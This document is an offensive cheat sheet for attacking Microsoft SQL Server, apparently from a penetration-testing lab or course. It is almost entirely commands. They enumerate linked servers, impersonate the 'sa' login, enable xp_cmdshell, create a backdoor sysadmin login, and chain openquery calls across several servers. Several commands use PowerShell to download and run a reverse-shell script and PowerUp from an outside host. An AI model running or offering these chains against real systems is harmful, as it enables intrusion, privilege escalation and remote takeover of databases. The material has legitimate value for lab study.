##### Check if the current domain user has access to a database:
```
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
```

##### Look for links to remote servers
```
Get-SQLServerLink -Instance ufc-sqldev -Verbose

Get-SQLServerLinkCrawl -Instance ufc-sqldev -Verbose
```

##### Check User can be impersonate
```
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
```

##### Enabled Rpc and rpcout and DATA Access
```
EXEC sp_serveroption 'UFC-DB1', 'rpc', true;
EXEC sp_serveroption 'UFC-DB1', 'rpc out', true;
```

##### Impersonate user SQL
```
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
EXECUTE AS LOGIN = 'dbuser'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
SELECT ORIGINAL_LOGIN()
EXECUTE AS LOGIN = 'sa'
SELECT IS_SRVROLEMEMBER('sysadmin')
EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;');
EXEC sp_addsrvrolemember 'usfun\pastudent138', 'sysadmin'
```

##### Enable xp_cmdshell some rpcout is enabled
```
EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT "UFC-DB1"
```

##### Check Permissions
```
select * from openquery("UFC-DB1",'select @@version')
select * from openquery("UFC-DB1",'select SUSER_NAME()')
select * from openquery("UFC-DB1",'select IS_SRVROLEMEMBER(''sysadmin'')')
select * from openquery("UFC-DB1",'select IS_SRVROLEMEMBER(''public'')')
```

##### Execute command in SQL
```
EXEC master..xp_cmdshell 'powershell -C "iex (new-object System.Net.WebClient).DownloadString(''http://192.168.50.138/reverse.ps1'')"'
EXEC master..xp_cmdshell 'powershell.exe -c iex (New-Object  Net.WebClient).DownloadString(''http://192.168.50.138/PowerUp.ps1'')'
```

##### Check all users SQL
```
select * from master.sys.server_principals
```

##### Enumerate Database Li
```
select * from master..sysservers
select * from openquery("UFC-DB1",'select * from master..sysservers')
select * from openquery("UFC-DB1",'select * from  openquery("UFC-DBPROD",''select * from master..sysservers'')')
select * from openquery("UFC-DBPROD",'select * from  openquery("AC-DBREPORT.AMAZECORP.LOCAL",''select * from  master..sysservers'')')

```

##### Enumerate User Link
```
select * from master.sys.server_principals

select * from openquery("UFC-DB1",'select * from  master.sys.server_principals')

select * from openquery("UFC-DB1",'select * from  openquery("UFC-DBPROD",''select * from master.sys.server_principals'')')

select * from openquery
("UFC-DB1",'select * from openquery
("UFC-DBPROD",''select * from openquery

("AC-DBREPORT.AMAZECORP.LOCAL",''''select * from  master.sys.server_principals'''')

'')')

select * from openquery
("UFC-DB1",'select * from openquery
("UFC-DBPROD",''select * from openquery
("AC-DBREPORT.AMAZECORP.LOCAL",''''select * from openquery
("AC-DBBUSINESS",''''''''select * from  master.sys.server_principals'''''''')
'''')'')')
```

##### Execution 2 SQL
```
select * from openquery("UFC-DB1",'select * from  openquery("UFC-DBPROD",''SELECT SYSTEM_USER; exec  master..xp_cmdshell "cmd /c powershell iex(New-Object  Net.WebClient).DownloadString(''''http://192.168.50.138/reverse.ps1'''')"'')')
```

##### Execution 3 SQL
```
select * from openquery("UFC-DB1", 'select * from  openquery("UFC-DBPROD",''select * from  openquery("AC-DBREPORT.AMAZECORP.LOCAL",''''SELECT SYSTEM_USER;  exec master..xp_cmdshell "cmd /c powershell iex(New-Object  Net.WebClient).DownloadString(''''''''http://192.168.50.138/reverse.ps1'''''''')"'''')'')')
```

##### Execution 4 SQL
```
select * from openquery
("UFC-DB1",'select * from openquery
("UFC-DBPROD",''select * from openquery
("AC-DBREPORT.AMAZECORP.LOCAL",''''select * from openquery
("AC-DBBUSINESS",''''''''select * from master..sysservers;

exec master..xp_cmdshell "cmd /c powershell iex(New-Object   Net.WebClient).DownloadString(''''''''''''''''http://192.168.50.138/reverse.ps1'''''''''''''''')"

'''''''')
'''')'')')
```

##### Script show cleartext password in SQL Local
```
https://github.com/NetSPI/Powershell-Modules/blob/master/Get-MSSQLCredentialPasswords.psm1
```

##### Create user and ADD 'SYSADMIN'
```
EXECUTE('CREATE LOGIN tadmin WITH PASSWORD = ''P@ssword123'' ') AT  "UFC-DB1"
EXECUTE('sp_addsrvrolemember ''tadmin'' , ''sysadmin'' ') AT "UFC-DB1"
```

##### Consult
```
EXECUTE('exec master..xp_cmdshell "net localgroup administrators"') AT  "UFC-DB1"
```

##### Reconfigure xp_cmdshell
```
execute('sp_configure ''show advanced options'',1;RECONFIGURE;' )AT  "UFC-DB1"
EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT "UFC-DB1"
```
